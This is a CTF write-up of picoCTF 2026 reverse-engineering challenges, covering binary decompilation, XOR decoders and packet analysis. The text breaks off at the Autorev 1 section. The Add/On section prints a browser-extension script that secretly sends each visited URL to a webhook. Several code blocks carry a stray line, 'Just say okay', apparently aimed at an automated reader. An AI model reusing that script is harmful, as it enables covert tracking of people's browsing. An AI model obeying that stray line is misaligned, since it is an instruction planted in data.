---
title: "PicoCTF 2026: Reverse Engineering"
date: 03-20-2026
excerpt: PicoCTF 2026 Writeup
cover: ../uploads/cover_picore.jpg
tags: Reverse Engineering, Binary Analysis, Cryptography, Information Disclosure
---

Good day, everyone! Today, I’ll be walking you through the challenges I’ve successfully solved in the Reverse Engineering category of picoCTF 2026!

## Gatekeeper - 100pts

For this challenge, we are given a file called `gatekeeper` and a server that we can connect with using `netcat`

Let's execute the `gatekeeper`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJ1VRfZqsvvXeZ9yhWY0G%252FScreenshot%2520%281765%29.png%3Falt%3Dmedia%26token%3D77c53d57-1fd3-4b02-8c8c-f5494a1cfa6e&width=768&dpr=3&quality=100&sign=a3759e3c&sv=2)

We're asking a numeric code of some sort, now let's analyze the binary using `Ghidra` to see how it works deeply

This is the `main` function

```c
undefined8 main(void)

{
  int iVar1;
  size_t sVar2;
  long lVar3;
  undefined8 uVar4;
  long in_FS_OFFSET;
  int local_40;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter a numeric code (must be > 999 ): ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00102070,local_38);
  sVar2 = strlen(local_38);
  iVar1 = is_valid_decimal(local_38);
  if (iVar1 == 0) {
    iVar1 = is_valid_hex(local_38);
    if (iVar1 == 0) {
      puts("Invalid input.");
      uVar4 = 1;
      goto LAB_00101698;
    }
    lVar3 = strtol(local_38,(char **)0x0,0x10);
    local_40 = (int)lVar3;
  }
  else {
    local_40 = atoi(local_38);
  }
  if (local_40 < 1000) {
    puts("Too small.");
  }
  else if (local_40 < 10000) {
    if ((int)sVar2 == 3) {
      reveal_flag();
    }
    else {
      puts("Access Denied.");
    }
  }
  else {
    puts("Too high.");
  }
  uVar4 = 0;
LAB_00101698:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar4;
}
```

This is the `reveal_flag` function

```c
void reveal_flag(void)

{
  FILE *__stream;
  size_t __n;
  void *__ptr;
  uint local_24;
  
  __stream = fopen("/flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Flag file not found.");
  }
  else {
    fseek(__stream,0,2);
    __n = ftell(__stream);
    rewind(__stream);
    __ptr = malloc(__n + 1);
    if (__ptr != (void *)0x0) {
      fread(__ptr,1,__n,__stream);
      *(undefined1 *)((long)__ptr + __n) = 0;
      fclose(__stream);
      printf("Access granted: ");
      local_24 = (uint)__n;
      while (local_24 = local_24 - 1, -1 < (int)local_24) {
        putchar((int)*(char *)((long)__ptr + (long)(int)local_24));
        if ((local_24 & 3) == 0) {
          printf("ftc_oc_ip");
        }
      }
      putchar(10);
      free(__ptr);
    }
  }
  return;
}
```

To solve this, we must reach `reveal_flag();`

```c
if (local_40 < 1000) → Too small
else if (local_40 < 10000)
    if (strlen == 3) → reveal_flag()
```

So requirements:

1. Input must be numeric (decimal OR hex)
2. Converted value must be:

```text
1000 ≤ value < 10000
```

3. Length of input string must be exactly **3**

But here's the problem, if we put `999` it will be treated as `too small` but if we put `1000` , the length of the input is 4, remember we only need 3 for input string. This is impossible for decimal. That why we will use **hex input**.

Because code allows:

```c
is_valid_hex()
strtol(..., 16)
```

So length can be 3, but value can be >999.

All we need is to find the hex value of decimals that can be more than or exact `1000` .

This is all valid:

```text
3E8
400
ABC
FFF
7D0
```

Now let's take a look at the `reveal_flag()`

The flag prints reversed + inserts text:

```c
putchar reversed
if (index % 4 == 0)
    print "ftc_oc_ip"
```

So when we got the flag, we need to rearrange it because the flag will be jumbled once we got it.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FTmdNA7123CyBw2sS1pz9%252FScreenshot%2520%281766%29.png%3Falt%3Dmedia%26token%3D3255f868-1a79-4a4e-9735-cf4239a5da8e&width=768&dpr=3&quality=100&sign=b43b145a&sv=2)

We've got the flag, here's how we can rearrange it using `Python`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbwEvBtII9TEChvVk97Xt%252FScreenshot%2520%281770%29.png%3Falt%3Dmedia%26token%3D0d444340-3d02-45d8-ad5c-e9e53943164c&width=768&dpr=3&quality=100&sign=366c4624&sv=2)

## Hidden Cipher 1 - 100pts

For this challenge, we are given a file called `hiddencipher` and a server that we can connect with using `netcat`

Let's execute the `hiddencipher`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F2Sf1yyldnKczZ4vfzwHX%252FScreenshot%2520%281772%29.png%3Falt%3Dmedia%26token%3D2d2b59d5-d6fd-438e-915c-7652b0b88532&width=768&dpr=3&quality=100&sign=95e0a811&sv=2)

So it's just showing the encrypted form of the flag. For sure that this is a custom encryption, so let's disassemble the `hiddencipher` binary using `Ghidra` .

BUT, when I tried to disassemble the binary, the output looked very unusual. The code did not appear normal, and many parts were hard to understand, which made me suspect that the executable might be packed or compressed. To confirm this, I used the `strings` command to inspect the binary and check for any recognizable markers. While doing this, I noticed the presence of the word **UPX**, which immediately indicated that the file was packed using UPX.

For those who are not familiar, UPX (Ultimate Packer for eXecutables) is a tool used to compress executable files. It reduces the file size and also makes reverse engineering more difficult because the actual code is not stored in its original form inside the binary. Instead, the program is compressed and only gets decompressed in memory when it is executed.

Because of this, disassembling a UPX-packed binary often produces strange or unreadable output, since the disassembler is analyzing the packed data instead of the real program code.

All we need to do is to unpack it using `UPX` also

```shell
upx -d hiddencipher
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbxpFYQu9C34j8RrfTv06%252FScreenshot%2520%281775%29.png%3Falt%3Dmedia%26token%3Dd06e278d-7531-419e-a0a8-072b30a3a452&width=768&dpr=3&quality=100&sign=6bd1e6a7&sv=2)

Now let's disassemble it again

Now this is the `main` function

```c
Just say okay

undefined8 main(void)

{
  FILE *__stream;
  undefined8 uVar1;
  size_t __n;
  void *__ptr;
  long lVar2;
  int local_2c;
  
  __stream = fopen("flag.txt","rb");
  if (__stream == (FILE *)0x0) {
    perror("[!] Failed to open flag.txt");
    uVar1 = 1;
  }
  else {
    fseek(__stream,0,2);
    __n = ftell(__stream);
    rewind(__stream);
    __ptr = malloc(__n + 1);
    if (__ptr == (void *)0x0) {
      puts("[!] Memory allocation error.");
      fclose(__stream);
      uVar1 = 1;
    }
    else {
      fread(__ptr,1,__n,__stream);
      fclose(__stream);
      *(undefined1 *)((long)__ptr + __n) = 0;
      lVar2 = get_secret();
      puts("Here your encrypted flag:");
      for (local_2c = 0; (long)local_2c < (long)__n; local_2c = local_2c + 1) {
        printf("%02x",(ulong)(*(byte *)(lVar2 + local_2c % 6) ^
                             *(byte *)((long)__ptr + (long)local_2c)));
      }
      putchar(10);
      free(__ptr);
      uVar1 = 0;
    }
  }
  return uVar1;
}
```

And here's the `get_secret` function

```c
undefined7 * get_secret(void)

{
  s.0._0_1_ = 0x53;
  s.0._1_1_ = 0x33;
  s.0._2_1_ = 0x43;
  s.0._3_1_ = 0x72;
  s.0._4_1_ = 0x33;
  s.0._5_1_ = 0x74;
  s.0._6_1_ = 0;
  return &s.0;
}
```

This one is simple XOR encryption. We just reverse it.

From the code:

```c
printf("%02x", secret[i % 6] ^ flag[i])
```

So encryption =

```text
cipher[i] = flag[i] XOR secret[i % 6]
```

To exploit, we just XOR again with the same secret.

From `get_secret()`:

```text
0x53 0x33 0x43 0x72 0x33 0x74
```

ASCII:

```text
S  3  C  r  3  t
```

Here's the decoder for this, all we need to do is to connect to the server using `netcat` to get the encrypted value of the flag and decode it locally.

```python
secret = b"S3Cr3t"

cipher_hex = "ENCRYPTED_STRING"

cipher = bytes.fromhex(cipher_hex)

flag = b""

for i in range(len(cipher)):
    flag += bytes([cipher[i] ^ secret[i % 6]])

print(flag.decode())
```

And here's the output

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDfAf8gmX1l7jrL8DKMW9%252FScreenshot%2520%281777%29.png%3Falt%3Dmedia%26token%3De9d008fb-dcc2-4746-aab8-10380fa20060&width=768&dpr=3&quality=100&sign=4c55ca2d&sv=2)

## Hidden Cipher 2 - 100pts

For this challenge, we are given a file called `hiddencipher2` and a server that we can connect with using `netcat`

Let's execute the `hiddencipher2`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F1rxtIwJT7km98cKDZ6pr%252FScreenshot%2520%281778%29.png%3Falt%3Dmedia%26token%3Da0f7339f-c289-42f5-a9ad-ddf782d1131c&width=768&dpr=3&quality=100&sign=15b25e23&sv=2)

Okay so here, before we get the encoded flag value, we have to solve some math problem.

Gladly, we don't need `UPX` for this, we can now disassemble it directly to `Ghidra`

Here's the `main` function

```c
undefined8 main(void)

{
  int iVar1;
  time_t tVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  char local_29;
  uint local_28;
  uint local_24;
  int local_20;
  int local_1c;
  void *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  local_1c = generate_math_question(&local_29,&local_28,&local_24);
  printf("What is %d %c %d? ",(ulong)local_28,(ulong)(uint)(int)local_29,(ulong)local_24);
  fflush(stdout);
  iVar1 = __isoc23_scanf(&DAT_0010201d,&local_20);
  if (iVar1 == 1) {
    if (local_1c == local_20) {
      local_18 = (void *)read_flag_file("flag.txt");
      if (local_18 == (void *)0x0) {
        uVar3 = 1;
      }
      else {
        encode_flag(local_18,local_1c);
        free(local_18);
        uVar3 = 0;
      }
    }
    else {
      puts("Wrong answer! No flag for you.");
      uVar3 = 1;
    }
  }
  else {
    puts("Invalid input. Exiting.");
    uVar3 = 1;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}
```

Here's the `generate_math_question` function

```c
int generate_math_question(undefined1 *param_1,int *param_2,int *param_3)

{
  int iVar1;
  
  iVar1 = rand();
  *param_2 = iVar1 % 10 + 1;
  iVar1 = rand();
  *param_3 = iVar1 % 0xb;
  iVar1 = rand();
  if (iVar1 % 3 == 0) {
    *param_1 = 0x2b;
    iVar1 = *param_3 + *param_2;
  }
  else if (iVar1 % 3 == 1) {
    *param_1 = 0x2d;
    if (*param_2 < *param_3) {
      iVar1 = *param_2;
      *param_2 = *param_3;
      *param_3 = iVar1;
    }
    iVar1 = *param_2 - *param_3;
  }
  else {
    *param_1 = 0x2a;
    iVar1 = *param_3 * *param_2;
  }
  return iVar1;
}
```

Here's the `read_flag_file` function

```c
void * read_flag_file(char *param_1)

{
  FILE *__stream;
  void *__ptr;
  size_t __n;
  
  __stream = fopen(param_1,"r");
  if (__stream == (FILE *)0x0) {
    perror("Could not open flag file");
    __ptr = (void *)0x0;
  }
  else {
    fseek(__stream,0,2);
    __n = ftell(__stream);
    rewind(__stream);
    __ptr = malloc(__n + 1);
    if (__ptr == (void *)0x0) {
      perror("Memory error");
      fclose(__stream);
      __ptr = (void *)0x0;
    }
    else {
      fread(__ptr,1,__n,__stream);
      *(undefined1 *)((long)__ptr + __n) = 0;
      fclose(__stream);
    }
  }
  return __ptr;
}
```

Take a closer look at this at the `main` function:

```c
encode_flag(local_18, local_1c);
```

* `local_18` → flag string
* `local_1c` → correct math answer
* So the flag is encoded using the answer we gave. THE ANSWER IS THE KEY.

Let's connect to the server

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FmmH7eDb0wZAIPCJPJXZ3%252FScreenshot%2520%281784%29.png%3Falt%3Dmedia%26token%3D3d9f05bc-9232-422f-a4fb-6f5cc4216b80&width=768&dpr=3&quality=100&sign=7cd3d158&sv=2)

Most likely, the encoding process is:

```text
encoded[i] = flag[i] * key
```

because numbers look like multiples of 2.

```text
224 / 2 = 112 = 'p'
210 / 2 = 105 = 'i'
198 / 2 = 99  = 'c'
222 / 2 = 111 = 'o'
```

So correct formula:

```text
flag_char = encoded / answer
```

Here's the decoder using Python

```python
nums = [224, 210, 198, 222, 134, 168, 140, 246, 218, 104, 232, 208, 190, 196, 102, 208, 98, 220, 200, 190, 198, 98, 224, 208, 102, 228, 190, 204, 102, 204, 100, 100, 198, 108, 108, 250]

key = 2

flag = "".join(chr(n // key) for n in nums)

print(flag)
```

Here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8LlDAMSCVtygw3G3z8tt%252FScreenshot%2520%281785%29.png%3Falt%3Dmedia%26token%3D143ff701-409c-4c1b-9f8b-0c7d0875f8f8&width=768&dpr=3&quality=100&sign=4e05abea&sv=2)

## Bypass Me - 100pts

For this challenge, we are given an SSH server that we can access.

Inside the SSH we have a binary file called `bypassme.bin`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FHWFU6jC9pEkGLRpFQOrK%252FScreenshot%2520%281786%29.png%3Falt%3Dmedia%26token%3D35fdd134-fe9c-4d07-9919-fe6f71c7fee5&width=768&dpr=3&quality=100&sign=928664b6&sv=2)

So it's asking for a password. Now let's transfer it to our machine to disassemble it.

We will use `scp` for this.

```shell
scp -P 56837 ctf-player@foggy-cliff.picoctf.net:/home/ctf-player/bypassme.bin .
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FuRBVoW2vBJXgdpjepa86%252FScreenshot%2520%281788%29.png%3Falt%3Dmedia%26token%3D64695331-b82a-4686-afa1-b35f86190ef7&width=768&dpr=3&quality=100&sign=14719b5f&sv=2)

Now let's disassemble it using `Ghidra`

Here's the `main` function

```c
/* WARNING: Unknown calling convention */

int main(void)

{
  long lVar1;
  int iVar2;
  size_t sVar3;
  FILE *__stream;
  char *pcVar4;
  long in_FS_OFFSET;
  int attempts;
  FILE *flag_file;
  char buf [128];
  char sanitized [128];
  char password [128];
  char flag [128];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  attempts = 3;
  decode_password(password);
  intro_sequence();
  do {
    if (attempts == 0) {
      puts("\nAll attempts used. Try harder!");
      iVar2 = 1;
LAB_00101823:
      if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return iVar2;
    }
    printf("\n[%d tries left] Enter password: ",(ulong)(uint)attempts);
    fflush(stdout);
    fgets(buf,0x80,stdin);
    sVar3 = strcspn(buf,"\n");
    buf[sVar3] = '\0';
    sanitize(buf,sanitized);
    printf("\nRaw Input:      [%s]\n",buf);
    printf("Sanitized Input:[%s]\n",sanitized);
    puts("Hint: Input must match something special...");
    iVar2 = strcmp(buf,password);
    if (iVar2 == 0) {
      auth_sequence();
      __stream = fopen("../../root/flag.txt","r");
      if (__stream == (FILE *)0x0) {
        puts("Flag file not found.");
      }
      else {
        pcVar4 = fgets(flag,0x80,__stream);
        if (pcVar4 == (char *)0x0) {
          puts("Error reading flag.");
        }
        else {
          printf(&DAT_00102832,flag);
        }
        fclose(__stream);
      }
      iVar2 = 0;
      goto LAB_00101823;
    }
    puts("Access Denied ");
    attempts = attempts + -1;
  } while( true );
}
```

And here's the `decode_password` function

```c
void decode_password(char *out)

{
  long lVar1;
  long in_FS_OFFSET;
  char *out_local;
  int i;
  uchar enc [11];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  enc[0] = 0xf9;
  enc[1] = 0xdf;
  enc[2] = 0xda;
  enc[3] = 0xcf;
  enc[4] = 0xd8;
  enc[5] = 0xf9;
  enc[6] = 0xcf;
  enc[7] = 0xc9;
  enc[8] = 0xdf;
  enc[9] = 0xd8;
  enc[10] = 0xcf;
  for (i = 0; (uint)i < 0xb; i = i + 1) {
    out[i] = enc[i] ^ 0xaa;
  }
  out[0xb] = '\0';
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

The program calls `decode_password(password)` at the very beginning of `main`. By the time the program asks for our input, the correct password already exists in the computer's memory in plain text.

The challenge encourage us to use `LLDB` but we can solve this using static analysis, look at the `decode_password` function carefully, we see a simple XOR cipher. Every byte in the `enc` array is XORed with the hex value `0xaa`.

| Index | Enc Value (Hex) | XOR Key | Result (Hex) | ASCII Character |
|-------|----------------|----------|--------------|-----------------|
| 0 | 0xf9 | 0xaa | 0x53 | S |
| 1 | 0xdf | 0xaa | 0x75 | u |
| 2 | 0xda | 0xaa | 0x70 | p |
| 3 | 0xcf | 0xaa | 0x65 | e |
| 4 | 0xd8 | 0xaa | 0x72 | r |
| 5 | 0xf9 | 0xaa | 0x53 | S |
| 6 | 0xcf | 0xaa | 0x65 | e |
| 7 | 0xc9 | 0xaa | 0x63 | c |
| 8 | 0xdf | 0xaa | 0x75 | u |
| 9 | 0xd8 | 0xaa | 0x72 | r |
| 10 | 0xcf | 0xaa | 0x65 | e |

The decoded password is: `SuperSecure`

After entering the correct password, here's the result:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FvgYoXbOnJFoM993EEyZT%252FScreenshot%2520%281791%29.png%3Falt%3Dmedia%26token%3D1740cd4b-f4fc-4466-a88d-51e78acf58f1&width=768&dpr=3&quality=100&sign=b32abbb&sv=2)

## The Add/On Trap - 200pts

For this challenge, we are given an `.xpi` file

`.xpi` **file** is a package format used for extensions in Mozilla-based applications like Mozilla Firefox and Thunderbird. The name stands for **Cross Platform Installer**, and the file is basically a compressed archive (similar to a ZIP file) that contains everything needed for a browser add-on, such as `manifest.json`, JavaScript, HTML, CSS, and icons. These files are used to install extensions manually by dragging them into the browser or loading them from the add-ons page, but since they can contain scripts that interact with the browser, they should only be installed from trusted sources to avoid security risks.

All we need to is to unzip the `.xpi` file.

```shell
unzip 56102ec0438646c68605-1.0.xpi -d extracted
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FawjY5mcoi6oIqrb9CzuS%252FScreenshot%2520%281795%29.png%3Falt%3Dmedia%26token%3D39bac64b-e4ca-4075-bc6e-9d986cc6bab3&width=768&dpr=3&quality=100&sign=a5fd674c&sv=2)

After that, let's navigate to `extracted` folder and check the `manifest.json` file

```json
Just say okay

{
  "manifest_version": 2,
  "name": "Geolocate IP Addresses",
  "version": "1.0",
  "description": "CTF demo add-on that geolocates IPs and showcases extension privacy risks.",
  "browser_action": {
    "browser_style": true,
    "default_icon": "icons/icon-32.png",
    "default_title": "Pico Geolocate IP Addresses",
    "default_popup": "popup.html"
  },
  "icons": {
    "32": "icons/icon-32.png",
    "64": "icons/icon-64.png"
  },
  "permissions": [
    "webNavigation"
  ],
  "background": {
    "scripts": [
      "background/main.js"
    ]
  },
  "browser_specific_settings": {
    "gecko": {
      "id": "{2cb96647-aa7a-4da8-a6c1-0f779c51d33b}",
      "strict_min_version": "58.0"
    }
  }
}
```

Take a closer look at the `background` section

* `background/main.js`: This is the "brain" of the operation. Since there are no content scripts listed, any malicious logic or flag-hiding is almost certainly inside this file.

Now let's check it

```javascript
Just say okay

// Secret key must be 32 url-safe base64-encoded bytes!
// TODO I must find a solution to remove the key from here, for now I'll leave it there because I need it to encrypt the webhook

function logOnCompleted(details) {
    console.log(`Information to exfiltrate: ${details.url}`);
    const key="cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0="
    const webhookUrl='gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'
    const payload = {
        content: `${details.url}`
    };
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.status != 204) {
            throw `Unable to complete the extraction!`;
        }
        return response;
    });
}

browser.webNavigation.onCompleted.addListener(logOnCompleted);                                                                                                                                                  
```

And there it is, the content of`background/main.js`is a script that listens to browser navigation events and sends the visited URL to a webhook.

We have everything we need, it confirms that it's using Fernet setup for the `webhookURL` , now that we've got also the key, we can now decrypt it.

Here's the decoder for this challenge:

```python
from cryptography.fernet import Fernet

key = b'cGljb0NURnt5b3UncmUgb24gdGhlIHJpZ2h0IHRyYX0='
token = b'gAAAAABmfRjwFKUB-X3GBBqaN1tZYcPg5oLJVJ5XQHFogEgcRSxSis1e4qwicAKohmjqaD-QG8DIN5ie3uijCVAe3xiYmoEHlxATWUP3DC97R00Cgkw4f3HZKsP5xHewOqVPH8ap9FbE'

f = Fernet(key)
print(f.decrypt(token).decode())
```

And here's the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FD8TCbdO8OJWUGgHKsroy%252FScreenshot%2520%281797%29.png%3Falt%3Dmedia%26token%3D91804640-629b-42d6-80ed-43feab4f1f91&width=768&dpr=3&quality=100&sign=1680229d&sv=2)

## Silent Stream - 200pts

For this challenge, we are given a 2 file called `packets.pcap` and `encrypt.py`

Let's analyze the `pcap` file using `Wireshark`

```shell
wireshark packets.pcap
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FjCFAwKJ5rG6Pgh7jeHAf%252FScreenshot%2520%281798%29.png%3Falt%3Dmedia%26token%3D5cd5ecfa-6dff-4424-bc21-f5d5246d4654&width=768&dpr=3&quality=100&sign=33a93822&sv=2)

It's just all `TCP` traffic, next thing I did is to follow the stream, **Left Click -> Follow -> TCP Stream**

Here's the content:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUtf34v3Oj7tAsXdBXXXF%252FScreenshot%2520%281799%29.png%3Falt%3Dmedia%26token%3Dfe706d97-6b26-43ac-b98a-c3c11dee546a&width=768&dpr=3&quality=100&sign=11ac9739&sv=2)

When I converted it to raw bytes, I noticed a pattern in the content that looks like ciphertext, so the next step is to check the `encrypt.py` file.

```python
import socket

def encode_byte(b, key):

    return (b + key) % 256

def simulate_flag_transfer(filename, key=42):
    print(f"[!] flag transfer for '{filename}' using encoding key = {key}")

    with open(filename, "rb") as f:
        data = f.read()

    print(f"[+] Encoding and sending {len(data)} bytes...")

    for b in data:
        encoded = encode_byte(b, key)
        pass

    print("Transfer complete")

if __name__ == "__main__":
    simulate_flag_transfer("flag.txt")
```

The “encryption” in the code is actually a **very simple byte‑shift encoding.** Each byte of the file (`flag.txt`) is processed by the function `encode_byte(b, key)`, which returns `(b + key) % 256`. This means the program takes the numeric value of each byte, adds the key (default = 42), and then keeps the result within the byte range 0–255 using modulo 256. This is similar to a basic **Caesar cipher but applied to raw bytes**, so it’s easy to reverse by subtracting the same key: `(encoded - key) % 256`.

Now to decode what we saw in the `.pcap` file, let's save it to a file and let's write the decoder for this:

```python
def decrypt_file(input_file, output_file, key=42):
    with open(input_file, "rb") as f:
        data = f.read()

    # Subtract the key and wrap around 256
    decrypted_data = bytes([(b - key) % 256 for b in data])

    with open(output_file, "wb") as f:
        f.write(decrypted_data)
    
    print(f"Decryption complete. Check {output_file}")

decrypt_file("captured.bin", "restored_file")
```

Here's the output:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMr3C156GZSUYcoQu4BVM%252FScreenshot%2520%281800%29.png%3Falt%3Dmedia%26token%3Dc3884bcf-f0cd-4b3b-af67-0ac93a23e613&width=768&dpr=3&quality=100&sign=a5f8918f&sv=2)

When I check the header of the `restored_file`, here's the output

```shell
head restored_file
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FD0x15ybeHoKJrlK1fsk5%252FScreenshot%2520%281801%29.png%3Falt%3Dmedia%26token%3D3ecc25d5-ca57-49e4-b4f3-9b13ff2c614c&width=768&dpr=3&quality=100&sign=9e97f56a&sv=2)

As you can see, the file header shows `JFIF`, which means the file is actually an image. Let's open it.

```shell
xdg-open restored_file
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fvrdks90OEO5jBcgihXPH%252FScreenshot%2520%281802%29.png%3Falt%3Dmedia%26token%3D32abf9e2-c3ac-4546-b07e-11464ed6975c&width=768&dpr=3&quality=100&sign=b4d2c1d&sv=2)

## Autorev 1 - 200pts

For this challenge, we are given a server that we can connect with using `netcat`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F5XxgZC8lxef36nYOXMzc%252FScreenshot%2520%281803%29.png%3Falt%3Dmedia%26token%3Df46ea7d4-08fb-4611-b4e8-aab0f4e8e50a&width=768&dpr=3&quality=100&sign=8d134323&sv=2)

And it generates an insane amount of bytes, at first, I have no idea what to do that's why I decided to copy the whole hexadecimal value of the binary and decode it and save it to another file as an executable

```shell
echo "Hexadecimal Value of the Binary" | xxd -r -p > binary
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfMxNFN9bi1YiSv3nEFwG%252FScreenshot%2520%281804%29.png%3Falt%3Dmedia%26token%3Dc4fbe438-40ee-4c3b-af33-5c6ea47a6f02&width=768&dpr=3&quality=100&sign=ea62db5e&sv=2)

Next thing I did is to change it's permission using `chmod` and then run it.

